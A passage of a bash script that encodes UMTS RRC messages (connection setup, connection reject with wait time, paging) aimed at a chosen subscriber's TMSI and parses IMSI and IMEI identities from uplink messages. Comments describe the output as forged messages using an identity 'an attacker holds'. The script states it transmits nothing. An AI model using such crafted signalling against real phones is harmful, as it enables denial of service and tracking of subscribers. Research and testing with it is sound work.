                gsub(/^[ \t]+|[ \t]+$/, "", kk); gsub(/^[ \t]+|[ \t]+$/, "", vv)
                if (kk == k) val = vv
            }
            END { if (val != "") print val }')
    fi
    printf '%s' "${v:-$def}"
}
# A build verb reads a fixed set of keys, and anything else in the spec is a
# mistake that must not be swallowed: uair_cfg_get would fall back to the
# default and produce a message whose identity is not the one the caller asked
# for, which on the air looks entirely plausible. A spec is therefore read for
# its key names first, and an unknown key or a spec that is neither a readable
# file nor key=value pairs is refused.
uair_cfg_check() {  # verb-label, conf, then the keys that verb reads
    local label="$1" conf="${2:-}" k a ok keys=""
    shift 2
    [[ -z "$conf" ]] && return 0
    if [[ -f "$conf" ]]; then
        keys=$(awk '
            { sub(/#.*/, ""); sub(/\r$/, "") }
            { gsub(/^[ \t]+|[ \t]+$/, "") }
            NF == 0 { next }
            {
                i = index($0, "=")
                if (i == 0) { print "@malformed " $0; next }
                k = substr($0, 1, i - 1)
                gsub(/^[ \t]+|[ \t]+$/, "", k)
                print k
            }' "$conf")
    elif [[ "$conf" == *=* ]]; then
        keys=$(printf '%s' "$conf" | tr ',;' '\n\n' | awk '
            { i = index($0, "="); if (i == 0) next
              k = substr($0, 1, i - 1); gsub(/^[ \t]+|[ \t]+$/, "", k); print k }')
    else
        printf 'ERROR\t"%s" is neither a readable config file nor key=value pairs\n' "$conf" >&2
        printf 'WHY\t%s would otherwise fall back to every default, and the octets would describe a different subscriber from the one the caller named\n' "$label" >&2
        return 2
    fi
    while IFS= read -r k; do
        [[ -z "$k" ]] && continue
        if [[ "$k" == '@malformed '* ]]; then
            printf 'ERROR\tconfig line "%s" is not key=value\n' "${k#@malformed }" >&2
            printf 'WHY\ta line without a key cannot be attributed to a field, and guessing which field it meant is how a forged message ends up describing the wrong subscriber\n' >&2
            return 2
        fi
        ok=0
        for a in "$@"; do
            [[ "$a" == "$k" ]] && ok=1
        done
        if (( ok == 0 )); then
            printf 'ERROR\tkey "%s" is not a %s key\n' "$k" "$label" >&2
            printf 'WHY\t%s reads only %s; an unrecognised key would be ignored and its value replaced by a default, so the octets would not carry what was asked\n' "$label" "$*" >&2
            return 2
        fi
    done <<< "$keys"
    return 0
}

uair_cfg_uint() {  # conf, key, default, low, high, name
    local v
    v=$(uair_cfg_get "${1:-}" "$2" "$3")
    if ! [[ "$v" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\t%s must be a decimal number, got "%s"\n' "$6" "$v" >&2
        printf 'WHY\t%s is a constrained INTEGER in TS 25.331 and is placed in the bits of its range\n' "$6" >&2
        return 2
    fi
    if (( v < $4 || v > $5 )); then
        printf 'ERROR\t%s must be %s..%s, got %s\n' "$6" "$4" "$5" "$v" >&2
        printf 'WHY\t%s is an INTEGER(%s..%s) in TS 25.331; another value has no place in the field and would be a guess\n' \
            "$6" "$4" "$5" >&2
        return 2
    fi
    printf '%s' "$v"
}

# Enumerated alternatives, in declaration order, from the ASN.1 of clause 10.
UAIR_ESTCAUSE=(originatingConversationalCall originatingStreamingCall
    originatingInteractiveCall originatingBackgroundCall
    originatingSubscribedTrafficCall terminatingConversationalCall
    terminatingStreamingCall terminatingInteractiveCall
    terminatingBackgroundCall emergencyCall interRAT-CellReselection
    interRAT-CellChangeOrder registration detach
    originatingHighPrioritySignalling originatingLowPrioritySignalling
    callRe-establishment terminatingHighPrioritySignalling
    terminatingLowPrioritySignalling terminatingCauseUnknown mbms-Reception
    mbms-PTP-RB-Request delayTolerantAccess spare9 spare8 spare7 spare6 spare5
    spare4 spare3 spare2 spare1)
UAIR_PAGECAUSE=(terminatingConversationalCall terminatingStreamingCall
    terminatingInteractiveCall terminatingBackgroundCall
    terminatingHighPrioritySignalling terminatingLowPrioritySignalling
    terminatingCauseUnknown spare)
UAIR_REJCAUSE=(congestion unspecified)
UAIR_STATEIND=(cell-DCH cell-FACH cell-PCH ura-PCH)
uair_enum_index() {  # value, then the alternatives; prints the index or -1
    # Compared case-insensitively so that cell-dch and cell-DCH both name the
    # same alternative: the ASN.1 spelling is hyphenated and mixed case, which
    # is awkward to type, and a silent mismatch would place the wrong index.
    local v i=0 e
    v="${1,,}"
    shift
    for e in "$@"; do
        if [[ "${e,,}" == "$v" ]]; then printf '%s' "$i"; return 0; fi
        i=$(( i + 1 ))
    done
    printf '%s' -1
    return 1
}
uair_enum_name() {  # index, then the alternatives
    local i="${1:-0}"
    shift
    printf '%s' "${@:$(( i + 1 )):1}"
}

# ── shared encoders ─────────────────────────────────────────────────────
# LAI ::= SEQUENCE { plmn-Identity, lac }: PLMN-Identity then LAC. The MCC
# Digit and has no length prefix; the MNC is SIZE(2..3) and carries one bit
# saying which, then its digits.
uair_bw_lai() {  # mcc, mnc, lac-hex
    uair_bwdigits "$1" || return 2
    uair_bwu 1 $(( ${#2} - 2 )) || return 2
    uair_bwdigits "$2" || return 2
    uair_bwh "$3" || return 2
}
# InitialUE-Identity: a CHOICE of eight, three bits, then the
# chosen alternative. Only tmsi-and-LAI is offered: it is the identity an
# attacker holds for a UE it has already seen attach.
uair_bw_identity() {  # tmsi-hex, lac-hex, mcc, mnc
    uair_bwu 3 1 || return 2      # alternative 1: tmsi-and-LAI
    uair_bwh "$1" || return 2     # TMSI-GSM-MAP, BIT STRING (32)
    uair_bw_lai "$3" "$4" "$2" || return 2
}

# One RB-MappingOption: a single logical channel carried on DCH 1 in both
# directions, RB-MappingOption. The two present bits are
# ul-LogicalChannelMappings and dl-LogicalChannelMappingList.
uair_bw_rb_mapping() {  # logical channel identity, mac priority
    local lc="${1:-1}" pr="${2:-1}"
    uair_bwu 3 0                  # rb-MappingInfo SIZE(1..8), one entry (n-1)
    uair_bwu 2 3                  # both OPTIONAL components present
    uair_bwu 1 0                  # ul-LogicalChannelMappings: oneLogicalChannel
    uair_bwu 1 1                  # UL-LogicalChannelMapping present
    uair_bwu 2 0                  # ul-TransportChannelType: dch
    uair_bwu 5 0                  # TransportChannelIdentity(1..15) = 1
    uair_bwu 4 $(( lc - 1 ))      # LogicalChannelIdentity(1..15)
    uair_bwu 2 1                  # rlc-SizeList: configured
    uair_bwu 3 $(( pr - 1 ))      # MAC-LogicalChannelPriority(1..8)
    uair_bwu 1 0                  # dl-LogicalChannelMappingList SIZE(1..2), one entry
    uair_bwu 1 1                  # DL-LogicalChannelMapping present
    uair_bwu 2 0                  # dl-TransportChannelType: dch
    uair_bwu 5 0                  # DL TransportChannelIdentity(1..15) = 1
    uair_bwu 4 $(( lc - 1 ))      # DL logicalChannelIdentity(1..15)
}

# SRB1 is the only SRB that carries its RLC configuration explicitly: AM in
# both directions, SRB-InformationSetup and its two list types.
uair_bw_srb_am() {  # rb-identity, logical channel identity, mac priority
    uair_bwu 1 1                  # rb-Identity present
    uair_bwu 5 $(( ${1:-1} - 1 )) # INTEGER(1..32), offset by its lower bound
    uair_bwu 1 0                  # rlc-InfoChoice: rlc-Info (explicit modes)
    uair_bwu 2 3                  # ul-RLC-Mode and dl-RLC-Mode both present
    uair_bwu 2 0                  # ul-RLC-Mode: ul-AM-RLC-Mode
    uair_bwu 1 0                  # ul-AM-RLC-Mode: pollingInfo absent
    uair_bwu 2 3                  # transmissionRLC-Discard: noDiscard
    uair_bwu 4 0                  # noDiscard: dat1
    uair_bwu 4 11                 # transmissionWindowSize: tw2047
    uair_bwu 4 9                  # timerRST: tr500
    uair_bwu 3 0                  # max-RST: rst1
    uair_bwu 2 0                  # dl-RLC-Mode: dl-AM-RLC-Mode
    uair_bwu 1 1                  # inSequenceDelivery: true
    uair_bwu 4 11                 # receivingWindowSize: rw2047
    uair_bwu 3 0                  # dl-RLC-StatusInfo: both timers absent
    uair_bwu 1 0                  # missingPDU-Indicator: false
    uair_bw_rb_mapping "${2:-1}" "${3:-1}"
}
# SRB2..4 copy SRB1's RLC configuration (rlc-InfoChoice same-as-RB), which is
# what a network does when it sets up four signalling bearers.
uair_bw_srb_same() {  # rb-identity, logical channel identity, mac priority, same-as
    uair_bwu 1 1                  # rb-Identity present
    uair_bwu 5 $(( ${1:-1} - 1 ))
    uair_bwu 1 1                  # rlc-InfoChoice: same-as-RB
    uair_bwu 5 $(( ${4:-1} - 1 )) # the SRB whose RLC configuration is reused
    uair_bw_rb_mapping "${2:-1}" "${3:-1}"
}

# DedicatedTransChTFS: one transport format for one DCH.
uair_bw_tfs() {
    uair_bwu 3 1                  # tti: tti20
    uair_bwu 5 0                  # DedicatedDynamicTF-InfoList SIZE(1..32), one entry
    uair_bwu 1 1                  # rlc-Size: octetModeType1
    uair_bwu 2 0                  # octetModeType1: sizeType1
    uair_bwu 5 0                  # sizeType1 INTEGER(0..31)
    uair_bwu 5 0                  # numberOfTbSizeList SIZE(1..32), one entry
    uair_bwu 2 3                  # NumberOfTransportBlocks: large (18..512)
    uair_bwu 9 $(( 42 - 18 ))     # large: 42 blocks, offset by 18
    uair_bwu 2 1                  # logicalChannelList: configured
    uair_bwu 2 2                  # channelCodingType: turbo
    uair_bwu 8 $(( 100 - 1 ))     # rateMatchingAttribute INTEGER(1..256)
    uair_bwu 3 3                  # crc-Size: crc16
}

# TSV emitter shared by the three builders.
uair_rrc_emit() {  # message, message-type, channel, gsmtap sub-type, bits, [limit]
    local name="$1" type="$2" chan="$3" sub="$4" bits="$5" extra="${6:-}" hex
    hex=$(uair_bits_to_hex "$bits") || return 1
    printf 'message\t%s\n'         "$name"
    printf 'message_type\t%s\n'    "$type"
    printf 'channel\t%s\n'         "$chan"
    printf 'gsmtap_sub_type\t%s\n' "$sub"
    printf 'bits\t%s\n'            "${#bits}"
    printf 'bytes\t%s\n'           "$(( (${#bits} + 7) / 8 ))"
    printf 'hex\t%s\n'             "$hex"
    printf 'sent\t0\n'
    [[ -n "$extra" ]] && printf 'limit\t%s\n' "$extra"
    printf 'limit\tRRC octets only: no MAC-I, because an unprotected message carries none; no ciphering, because these messages precede security activation; and nothing is transmitted, because no radio is keyed here.\n'
}

# ── RRC CONNECTION SETUP (DL-CCCH) ──────────────────────────────────────
uair_build_rrc_setup() {
    uair_cfg_check "--build-rrc-setup" "${1:-}" tmsi lac mcc mnc txid srnc srnti drx state || return 2
    local conf="${1:-}" tmsi lac srnc srnti mcc mnc txid drx state sid
    tmsi=$(uair_padhex  "$(uair_cfg_get "$conf" tmsi  12345678)" 8) || return 2
    lac=$(uair_padhex   "$(uair_cfg_get "$conf" lac   1)"        4) || return 2
    srnc=$(uair_padhex  "$(uair_cfg_get "$conf" srnc  123)"      3) || return 2
    srnti=$(uair_padhex "$(uair_cfg_get "$conf" srnti 12345)"    5) || return 2
    mcc=$(uair_cfg_get "$conf" mcc 001)
    mnc=$(uair_cfg_get "$conf" mnc 01)
    txid=$(uair_cfg_uint "$conf" txid 0 0 3 "rrc-TransactionIdentifier") || return 2
    # UTRAN-DRX-CycleLengthCoefficient: INTEGER(3..9), seven values,
    # so three bits with the value offset by its lower bound.
    drx=$(uair_cfg_uint  "$conf" drx  6 3 9 "utran-DRX-CycleLengthCoefficient") || return 2
    state=$(uair_cfg_get "$conf" state cell-dch)
    sid=$(uair_enum_index "$state" "${UAIR_STATEIND[@]}") || {
        printf 'ERROR\tstate "%s" is not a state indicator\n' "$state" >&2
        printf 'WHY\tRRC-StateIndicator is cell-DCH, cell-FACH, cell-PCH or ura-PCH (TS 25.331 clause 10)\n' >&2
        return 2; }
    if (( ${#mcc} != 3 )); then
        printf 'ERROR\tmcc must be three digits, got "%s"\n' "$mcc" >&2
        printf 'WHY\tMCC is SIZE(3) OF Digit in the ASN.1 of TS 25.331 clause 10; a two- or four-digit MCC has no encoding\n' >&2
        return 2
    fi
    if (( ${#mnc} != 2 && ${#mnc} != 3 )); then
        printf 'ERROR\tmnc must be two or three digits, got "%s"\n' "$mnc" >&2
        printf 'WHY\tMNC is SIZE(2..3) OF Digit in the ASN.1 of TS 25.331 clause 10\n' >&2
        return 2
    fi

    uair_bw_reset
    # DL-CCCH-Message ::= SEQUENCE { integrityCheckInfo OPTIONAL, message }.
    uair_bwu 1 0                  # integrityCheckInfo absent: nothing protects this message yet
    uair_bwu 3 3                  # DL-CCCH-MessageType: rrcConnectionSetup is alternative 3 of 8
    # RRCConnectionSetup ::= CHOICE { r3, later-than-r3 }; version r3 here.
    uair_bwu 1 0                  # r3, not later-than-r3
    uair_bwu 1 0                  # r3: laterNonCriticalExtensions absent
    uair_bwu 10 0                 # r3-IEs: the ten OPTIONAL components, all absent
    uair_bw_identity "$tmsi" "$lac" "$mcc" "$mnc" || return 2
    uair_bwu 2 "$txid"            # rrc-TransactionIdentifier INTEGER(0..3)
    uair_bwh "$srnc"              # new-U-RNTI
    uair_bwh "$srnti"             #   s-RNTI
    uair_bwu 2 "$sid"             # rrc-StateIndicator
    uair_bwu 3 $(( drx - 3 ))     # utran-DRX-CycleLengthCoefficient INTEGER(3..9)
    uair_bwu 1 1                  # srb-InformationSetupList SIZE(3..4): one length bit, four entries
    uair_bw_srb_am   1 1 1
    uair_bw_srb_same 2 2 2 1
    uair_bw_srb_same 3 3 3 1
    uair_bw_srb_same 4 4 4 1
    # ul-AddReconfTransChInfoList: one DCH carrying the four signalling channels.
    uair_bwu 5 0                  # SIZE(1..32), one entry
    uair_bwu 1 0                  # ul-TransportChannelType: dch
    uair_bwu 5 0                  # TransportChannelIdentity(1..15) = 1
    uair_bwu 1 0                  # transportFormatSet: dedicatedTransChTFS
    uair_bw_tfs
    # dl-AddReconfTransChInfoList: the same shape in the other direction. The
    # item is a SEQUENCE, so its two-bit preamble comes after the list length.
    uair_bwu 5 0                  # SIZE(1..32), one entry
    uair_bwu 2 0                  # dch-QualityTarget and dummy absent
    uair_bwu 1 0                  # dl-TransportChannelType: dch
    uair_bwu 5 0                  # DL TransportChannelIdentity(1..15) = 1
    uair_bwu 1 0                  # tfs-SignallingMode: explicit-config
    uair_bwu 1 0                  # explicit-config: dedicatedTransChTFS
    uair_bw_tfs
    uair_rrc_emit "RRC CONNECTION SETUP" rrcConnectionSetup dl-ccch 2 "$UAIR_BW" \
        "the ten OPTIONAL r3-IEs are absent: activationTime, new-c-RNTI, capabilityUpdateRequirement, ul-CommonTransChInfo, dl-CommonTransChInfo, frequencyInfo, maxAllowedUL-TX-Power, ul-ChannelRequirement, dl-CommonInformation and dl-InformationPerRL-List. Without frequencyInfo, dl-CommonInformation and dl-InformationPerRL-List the UE has no physical channel to key, so this message alone does not produce a working radio link."
}

# ── RRC CONNECTION REJECT (DL-CCCH) ─────────────────────────────────────
uair_build_rrc_reject() {
    uair_cfg_check "--build-rrc-reject" "${1:-}" tmsi lac mcc mnc txid cause wait || return 2
    local conf="${1:-}" tmsi lac mcc mnc txid cause cidx wait
    tmsi=$(uair_padhex "$(uair_cfg_get "$conf" tmsi 12345678)" 8) || return 2
    lac=$(uair_padhex  "$(uair_cfg_get "$conf" lac  1)"        4) || return 2
    mcc=$(uair_cfg_get "$conf" mcc 001)
    mnc=$(uair_cfg_get "$conf" mnc 01)
    txid=$(uair_cfg_uint "$conf" txid 0 0 3 "rrc-TransactionIdentifier") || return 2
    cause=$(uair_cfg_get "$conf" cause congestion)
    cidx=$(uair_enum_index "$cause" "${UAIR_REJCAUSE[@]}") || {
        printf 'ERROR\trejectionCause "%s" is not congestion or unspecified\n' "$cause" >&2
        printf 'WHY\tRejectionCause has those two values, one bit (TS 25.331 clause 10)\n' >&2
        return 2; }
    # WaitTime: INTEGER(0..15), four bits, the value written as-is.
    wait=$(uair_cfg_uint "$conf" wait 8 0 15 "WaitTime") || return 2

    uair_bw_reset
    uair_bwu 1 0                  # DL-CCCH-Message: integrityCheckInfo absent
    uair_bwu 3 1                  # DL-CCCH-MessageType: rrcConnectionReject is alternative 1 of 8
    uair_bwu 1 0                  # r3, not later-than-r3
    uair_bwu 1 0                  # r3: laterNonCriticalExtensions absent
    uair_bwu 1 0                  # r3-IEs: redirectionInfo absent (the only OPTIONAL component)
    uair_bw_identity "$tmsi" "$lac" "$mcc" "$mnc" || return 2
    uair_bwu 2 "$txid"
    uair_bwu 1 "$cidx"            # rejectionCause
    uair_bwu 4 "$wait"            # waitTime: how long the UE must stay away
    uair_rrc_emit "RRC CONNECTION REJECT" rrcConnectionReject dl-ccch 2 "$UAIR_BW" \
        "redirectionInfo is absent, as it is when the network only asks the UE to wait: a redirection needs a target the caller did not supply."
}

# ── PAGING TYPE 1 (PCCH) ────────────────────────────────────────────────
uair_build_paging() {
    uair_cfg_check "--build-paging" "${1:-}" tmsi cause domain mib || return 2
    local conf="${1:-}" tmsi cause cidx domain didx mib
    tmsi=$(uair_padhex "$(uair_cfg_get "$conf" tmsi 12345678)" 8) || return 2
    cause=$(uair_cfg_get "$conf" cause terminatingConversationalCall)
    cidx=$(uair_enum_index "$cause" "${UAIR_PAGECAUSE[@]}") || {
        printf 'ERROR\tpagingCause "%s" is not a paging cause\n' "$cause" >&2
        printf 'WHY\tPagingCause has eight values, three bits (TS 25.331 clause 10)\n' >&2
        return 2; }
    domain=$(uair_cfg_get "$conf" domain cs)
    case "$domain" in
        cs|cs-domain) didx=0 ;;
        ps|ps-domain) didx=1 ;;
        *) printf 'ERROR\tdomain "%s" is not cs or ps\n' "$domain" >&2
           printf 'WHY\tCN-DomainIdentity is cs-domain or ps-domain (TS 25.331 clause 10)\n' >&2
           return 2 ;;
    esac
    mib=$(uair_cfg_uint "$conf" mib 1 1 8 "MIB-ValueTag") || return 2

    uair_bw_reset
    uair_bwu 1 0                  # PCCH-MessageType: pagingType1 is alternative 0 of 2
    # PagingType1: pagingRecordList and bcch-ModificationInfo present,
    # laterNonCriticalExtensions absent.
    uair_bwu 3 6
    uair_bwu 3 0                  # PagingRecordList SIZE(1..8): one record
    uair_bwu 1 0                  # PagingRecord: cn-Identity
    uair_bwu 3 "$cidx"            # pagingCause
    uair_bwu 1 "$didx"            # cn-DomainIdentity
    uair_bwu 3 1                  # CN-PagedUE-Identity: tmsi-GSM-MAP
    uair_bwh "$tmsi"
    uair_bwu 1 0                  # BCCH-ModificationInfo: bcch-ModificationTime absent
    uair_bwu 3 $(( mib - 1 ))     # mib-ValueTag INTEGER(1..8)
    # The top-level alternative is pagingType1; the PDU it carries is
    # PagingType1. The type row uses the CHOICE name, as the other
    # builders do, so message_type stays comparable across channels.
    uair_rrc_emit "PAGING TYPE 1" pagingType1 pcch 4 "$UAIR_BW" \
        "one CN-originated record with a tmsi-GSM-MAP identity is built; utran-Identity paging and the imsi, p-TMSI and DS-41 identity alternatives are refused rather than guessed."
}

# ── RRC parse (the mirrored direction) ──────────────────────────────────
# The top-level CHOICE order per channel, from the ASN.1 of TS 25.331 clause
# 10 (the *-Message and *-MessageType definitions). It is written out in full
# because one wrong
# index classifies a message as a different one and the bits after it are then
# read at the wrong offsets.
uair_rrc_type_of() {  # channel, index -> "HUMAN<TAB>asn1Name"
    local chan="$1" idx="$2"
    local -a n=()
    case "$chan" in
        pcch) n=( 'PAGING TYPE 1|pagingType1' 'SPARE|pcchSpare' ) ;;
        dl-ccch) n=(
            'CELL UPDATE CONFIRM|rrcCellUpdateConfirm'
            'RRC CONNECTION REJECT|rrcConnectionReject'
            'RRC CONNECTION RELEASE|rrcConnectionRelease'
            'RRC CONNECTION SETUP|rrcConnectionSetup'
            'URA UPDATE CONFIRM|rrcUraUpdateConfirm'
            'DUMMY|dummy'
            'SPARE2|dlCcchSpare2'
            'SPARE1|dlCcchSpare1' ) ;;
        ul-ccch) n=(
            'CELL UPDATE|rrcCellUpdate'
            'RRC CONNECTION REQUEST|rrcConnectionRequest'
            'URA UPDATE|rrcUraUpdate'
            'UL-CCCH EXTENSION|ulCcchExtension' ) ;;
        dl-dcch) n=(
            'ACTIVE SET UPDATE|activeSetUpdate' 'ASSISTANCE DATA DELIVERY|assistanceDataDelivery'
            'CELL CHANGE ORDER FROM UTRAN|cellChangeOrderFromUTRAN'
            'CELL UPDATE CONFIRM|cellUpdateConfirm' 'COUNTER CHECK|counterCheck'
            'DOWNLINK DIRECT TRANSFER|downlinkDirectTransfer'
            'HANDOVER FROM UTRAN COMMAND (GSM)|handoverFromUTRANCommand-GSM'
            'HANDOVER FROM UTRAN COMMAND (CDMA2000)|handoverFromUTRANCommand-CDMA2000'
            'MEASUREMENT CONTROL|measurementControl' 'PAGING TYPE 2|pagingType2'
            'PHYSICAL CHANNEL RECONFIGURATION|physicalChannelReconfiguration'
            'PHYSICAL SHARED CHANNEL ALLOCATION|physicalSharedChannelAllocation'
            'RADIO BEARER RECONFIGURATION|radioBearerReconfiguration'
            'RADIO BEARER RELEASE|radioBearerRelease' 'RADIO BEARER SETUP|radioBearerSetup'
            'RRC CONNECTION RELEASE|rrcConnectionRelease'
            'SECURITY MODE COMMAND|securityModeCommand'
            'SIGNALLING CONNECTION RELEASE|signallingConnectionRelease'
            'TRANSPORT CHANNEL RECONFIGURATION|transportChannelReconfiguration'
            'TRANSPORT FORMAT COMBINATION CONTROL|transportFormatCombinationControl'
            'UE CAPABILITY ENQUIRY|ueCapabilityEnquiry'
            'UE CAPABILITY INFORMATION CONFIRM|ueCapabilityInformationConfirm'
            'UPLINK PHYSICAL CHANNEL CONTROL|uplinkPhysicalChannelControl'
            'URA UPDATE CONFIRM|uraUpdateConfirm'
            'UTRAN MOBILITY INFORMATION|utranMobilityInformation'
            'HANDOVER FROM UTRAN COMMAND (GERAN Iu)|handoverFromUTRANCommand-GERANIu'
            'MBMS MODIFIED SERVICES INFORMATION|mbmsModifiedServicesInformation'
            'ETWS PRIMARY NOTIFICATION WITH SECURITY|etwsPrimaryNotificationWithSecurity'
            'HANDOVER FROM UTRAN COMMAND (EUTRA)|handoverFromUTRANCommand-EUTRA'
            'UE INFORMATION REQUEST|ueInformationRequest'
            'LOGGING MEASUREMENT CONFIGURATION|loggingMeasurementConfiguration'
            'SPARE1|dlDcchSpare1' ) ;;
        ul-dcch) n=(
            'ACTIVE SET UPDATE COMPLETE|activeSetUpdateComplete'
            'ACTIVE SET UPDATE FAILURE|activeSetUpdateFailure'
            'CELL CHANGE ORDER FROM UTRAN FAILURE|cellChangeOrderFromUTRANFailure'
            'COUNTER CHECK RESPONSE|counterCheckResponse'
            'HANDOVER TO UTRAN COMPLETE|handoverToUTRANComplete'
            'INITIAL DIRECT TRANSFER|initialDirectTransfer'
            'HANDOVER FROM UTRAN FAILURE|handoverFromUTRANFailure'
            'MEASUREMENT CONTROL FAILURE|measurementControlFailure'
            'MEASUREMENT REPORT|measurementReport'
            'PHYSICAL CHANNEL RECONFIGURATION COMPLETE|physicalChannelReconfigurationComplete'
            'PHYSICAL CHANNEL RECONFIGURATION FAILURE|physicalChannelReconfigurationFailure'
            'RADIO BEARER RECONFIGURATION COMPLETE|radioBearerReconfigurationComplete'
            'RADIO BEARER RECONFIGURATION FAILURE|radioBearerReconfigurationFailure'
            'RADIO BEARER RELEASE COMPLETE|radioBearerReleaseComplete'
            'RADIO BEARER RELEASE FAILURE|radioBearerReleaseFailure'
            'RADIO BEARER SETUP COMPLETE|radioBearerSetupComplete'
            'RADIO BEARER SETUP FAILURE|radioBearerSetupFailure'
            'RRC CONNECTION RELEASE COMPLETE|rrcConnectionReleaseComplete'
            'RRC CONNECTION SETUP COMPLETE|rrcConnectionSetupComplete'
            'RRC STATUS|rrcStatus' 'SECURITY MODE COMPLETE|securityModeComplete'
            'SECURITY MODE FAILURE|securityModeFailure'
            'SIGNALLING CONNECTION RELEASE INDICATION|signallingConnectionReleaseIndication'
            'TRANSPORT CHANNEL RECONFIGURATION COMPLETE|transportChannelReconfigurationComplete'
            'TRANSPORT CHANNEL RECONFIGURATION FAILURE|transportChannelReconfigurationFailure'
            'TRANSPORT FORMAT COMBINATION CONTROL FAILURE|transportFormatCombinationControlFailure'
            'UE CAPABILITY INFORMATION|ueCapabilityInformation'
            'UPLINK DIRECT TRANSFER|uplinkDirectTransfer'
            'UTRAN MOBILITY INFORMATION CONFIRM|utranMobilityInformationConfirm'
            'UTRAN MOBILITY INFORMATION FAILURE|utranMobilityInformationFailure'
            'MBMS MODIFICATION REQUEST|mbmsModificationRequest'
            'UL-DCCH EXTENSION|ulDcchExtension' ) ;;
    esac
    if (( idx >= ${#n[@]} )); then
        printf 'UNKNOWN\tunknown'
        return 1
    fi
    printf '%s\t%s' "${n[idx]%%|*}" "${n[idx]#*|}"
}

# Walk the identity an uplink message carries. UAIR_POS is left on the bit
# after it so the caller can carry on.
uair_walk_identity() {  # bits, offset
    local bits="$1" p="$2" idx n i d s
    idx=$(uair_bits_int "$bits" "$p" 3) || { UAIR_POS=$p; return 1; }
    p=$(( p + 3 ))
    case "$idx" in
        0)  # IMSI-GSM-MAP, SIZE(6..21) OF Digit
            n=$(uair_bits_int "$bits" "$p" 4) || { UAIR_POS=$p; return 1; }
            p=$(( p + 4 )); n=$(( n + 6 ))
            s=""
            for (( i = 0; i < n; i++ )); do
                d=$(uair_bits_int "$bits" $(( p + 4 * i )) 4) || break
                s+="$d"
            done
            printf 'initial_ue_identity\timsi\n'
            printf 'imsi\t%s\n' "$s"
            p=$(( p + 4 * n )) ;;
        1|2)  # TMSI or P-TMSI plus LAI (and RAC for the P-TMSI form)
            printf 'initial_ue_identity\t%s\n' \
                "$([[ $idx == 1 ]] && echo tmsi-and-LAI || echo p-TMSI-and-RAI)"
            printf '%s\t%08x\n' "$([[ $idx == 1 ]] && echo tmsi || echo ptmsi)" \
                "$(uair_bits_int "$bits" "$p" 32)"
            p=$(( p + 32 ))
            uair_walk_lai "$bits" "$p" || { UAIR_POS=$p; return 1; }
            p=$UAIR_POS
            if (( idx == 2 )); then
                printf 'rac\t%02x\n' "$(uair_bits_int "$bits" "$p" 8)"
                p=$(( p + 8 ))
            fi ;;
        3)  # IMEI, SIZE(15) OF IMEI-Digit, no length prefix
            s=""
            for (( i = 0; i < 15; i++ )); do
                d=$(uair_bits_int "$bits" $(( p + 4 * i )) 4) || break
                s+="$d"
            done
            printf 'initial_ue_identity\timei\n'
            printf 'imei\t%s\n' "$s"
            p=$(( p + 60 )) ;;
        *)
            printf 'walk\tpartial\n'
            printf 'limit\tInitialUE-Identity alternative %s is not walked: only imsi, tmsi-and-LAI, p-TMSI-and-RAI and imei are pinned here (InitialUE-Identity in the standard names the other four)\n' "$idx"
            UAIR_POS=$p
            return 1 ;;
    esac
    UAIR_POS=$p
    return 0
}
uair_walk_lai() {  # bits, offset -> prints mcc/mnc/lac, UAIR_POS after it
    local bits="$1" p="$2" i d mcc="" mnc="" mnclen
    for (( i = 0; i < 3; i++ )); do
        d=$(uair_bits_int "$bits" $(( p + 4 * i )) 4) || { UAIR_POS=$p; return 1; }
        mcc+="$d"
    done
    p=$(( p + 12 ))
    mnclen=$(uair_bits_int "$bits" "$p" 1) || { UAIR_POS=$p; return 1; }
    p=$(( p + 1 )); mnclen=$(( mnclen + 2 ))
    for (( i = 0; i < mnclen; i++ )); do
        d=$(uair_bits_int "$bits" $(( p + 4 * i )) 4) || { UAIR_POS=$p; return 1; }
        mnc+="$d"
    done
    p=$(( p + 4 * mnclen ))
    printf 'mcc\t%s\n' "$mcc"
    printf 'mnc\t%s\n' "$mnc"
    printf 'lac\t%04x\n' "$(uair_bits_int "$bits" "$p" 16)"
    UAIR_POS=$(( p + 16 ))
    return 0
}

uair_walk_paging() {  # bits, offset after the message-type index
    local bits="$1" p="$2" pre n i kind cause dom idt bmi
    (( ${#bits} >= p + 4 )) || {
        printf 'walk\tnone\n'; printf 'limit\tthe message is shorter than the PagingType1 preamble\n'; return 0; }
    pre=$(uair_bits_int "$bits" "$p" 3); p=$(( p + 3 ))
    printf 'paging_record_list\t%s\n'        "$([[ $(( (pre >> 2) & 1 )) == 1 ]] && echo present || echo absent)"
    printf 'bcch_modification_info\t%s\n'    "$([[ $(( (pre >> 1) & 1 )) == 1 ]] && echo present || echo absent)"
    printf 'later_non_critical_extensions\t%s\n' "$([[ $(( pre & 1 )) == 1 ]] && echo present || echo absent)"
    if (( (pre >> 2) & 1 )); then
        n=$(uair_bits_int "$bits" "$p" 3); p=$(( p + 3 )); n=$(( n + 1 ))
        printf 'paging_records\t%s\n' "$n"
        for (( i = 0; i < n; i++ )); do
            kind=$(uair_bits_int "$bits" "$p" 1) || break
            p=$(( p + 1 ))
            if (( kind != 0 )); then
                printf 'limit\tPagingRecord %s is utran-Identity and is not walked\n' "$i"
                return 0
            fi
            cause=$(uair_bits_int "$bits" "$p" 3) || break
            dom=$(uair_bits_int "$bits" $(( p + 3 )) 1) || break
            idt=$(uair_bits_int "$bits" $(( p + 4 )) 3) || break
            p=$(( p + 7 ))
            printf 'paging_record_type\tcn-Identity\n'
            printf 'paging_cause\t%s\n' "$(uair_enum_name "$cause" "${UAIR_PAGECAUSE[@]}")"
            printf 'cn_domain\t%s\n' "$([[ $dom == 0 ]] && echo cs-domain || echo ps-domain)"
            case "$idt" in
                1|2)
                    printf 'cn_paged_ue_identity\t%s\n' \
                        "$([[ $idt == 1 ]] && echo tmsi-GSM-MAP || echo p-TMSI-GSM-MAP)"
                    printf 'tmsi\t%08x\n' "$(uair_bits_int "$bits" "$p" 32)"
                    p=$(( p + 32 )) ;;
                *)  printf 'limit\tCN-PagedUE-Identity alternative %s is not walked\n' "$idt"
                    return 0 ;;
            esac
        done
    fi
    if (( (pre >> 1) & 1 )); then
        bmi=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
        p=$(( p + 1 ))
        if (( bmi == 0 )); then
            printf 'mib_value_tag\t%s\n' "$(( $(uair_bits_int "$bits" "$p" 3) + 1 ))"
        else
            printf 'limit\tbcch-ModificationTime is not walked\n'
        fi
    fi
    return 0
}

uair_walk_request() {  # bits, offset after the message-type index
    local bits="$1" p="$2" pre cause pei
    (( ${#bits} >= p + 4 )) || {
